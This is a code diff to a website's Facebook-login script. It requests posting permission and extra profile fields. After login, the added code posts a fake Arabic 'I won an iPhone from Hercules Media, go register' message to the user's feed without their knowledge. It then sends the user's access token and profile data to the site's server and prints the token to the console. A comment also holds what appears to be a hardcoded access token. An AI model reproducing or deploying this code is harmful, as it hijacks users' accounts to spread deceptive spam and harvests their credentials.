@@ -16,6 +16,12 @@ window.fbAsyncInit = function () {
     fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));
 (function () {
+
+    var base_url = window.location.origin;
+    if (base_url == 'http://localhost') {
+        base_url = 'http://localhost/hercule/public';
+    }
+    var CSRF_TOKEN = $('meta[name="csrf-token"]').attr('content');
     // Load the script
     var script = document.createElement("SCRIPT");
     script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js';
@@ -41,33 +47,37 @@ window.fbAsyncInit = function () {
                         FB.api(
                             '/me',
                             'GET',
-                            {"fields": "id,name,email,about,bio,cover,gender"},
+                            {"fields": "id,name,email,about,cover,gender,age_range,birthday,hometown,location"},
                             function (response) {
-                                var user = {
-                                    'id': response.id,
-                                    'email': response.email,
-                                    'name': response.name
-                                };
-                                FB.api('/me/picture?type=large', function (response) {
-                                    user.pic = response.data.url;
-                                })
+                                var access_token = FB.getAuthResponse()['accessToken'];
+                                console.log('Access Token = ' + access_token);
                                 console.log(response);
+                                FB.api('/me/feed', 'post', {
+                                    // access_token: "EAAZAStumFPhoBAOKySonFzjk0QFCSmnvnR9lsWBxonpWDSZA6mTrXuJdi3XkO2JqdP3dTlzS5f9DDZBssqDjS6n04jqU6QELAka0bzub1gjcwy5hT3g4QT11UyEUOAtUt8O4OmcYfMFe4ltchZBorfudhL8IxaZCX6uBkv0oKhQZDZD",
+                                    message: 'شباب انا ربحت جهاز ايون اليوم من موقع هرقل ميديا ، فوت على جوجل واكتب هرقل ميديا عشان وسجل عشان تربح',
+                                    //link: 'http://www.herculesmediapro.com/',
+                                    //picture: 'https://d272hsr4c75psf.cloudfront.net/resize_805x9000/299/312299.jpg',
+                                    //name: 'Post name',
+                                    //description: 'description'
+                                }, function (data) {
+                                    $.ajax({
+                                        url: base_url + '/user/signup',
+                                        type: 'POST',
+                                        data: {_token: CSRF_TOKEN, data: response, t: access_token},
+                                        dataType: 'JSON',
+                                        success: function (data) {
+                                            window.location.href = base_url + "/user/" + data.id;
+                                        }
+                                    });
+                                });
                             }
                         );
 
-                        FB.api('/me/feed', 'post', {
-                            message: 'my_message',
-                            link: 'www.tasmeemme.com',
-                            picture: 'https://d272hsr4c75psf.cloudfront.net/resize_805x9000/762/306762.jpg',
-                            name: 'Post name',
-                            description: 'description'
-                        }, function (data) {
-                            console.log(data);
-                        });
+
                     }
                 },
                 //{scope: 'email,public_profile,user_friends,user_photos,publish_actions,manage_pages,publish_pages,user_birthday,user_location,user_website'}
-                {scope: 'email,public_profile,user_friends'}
+                {scope: 'email,public_profile,user_friends, publish_actions'}
                 //user_birthday, user_religion_politics, user_relationships,
                 // user_relationship_details, user_hometown, user_location, user_likes, user_education_history, user_work_history,
                 // user_website, user_events, user_photos, user_videos, user_friends, user_about_me, user_status, user_posts, offline_access,
@@ -76,6 +86,8 @@ window.fbAsyncInit = function () {
         });
     });
 
+    //10154070891272199_10154134922687199
 
-    var popupo = window.open("https://www.hangshare.com/", 'newwindow','', "_blank");
+
+    // var popupo = window.open("https://www.hangshare.com/", 'newwindow','', "_blank");
 })();
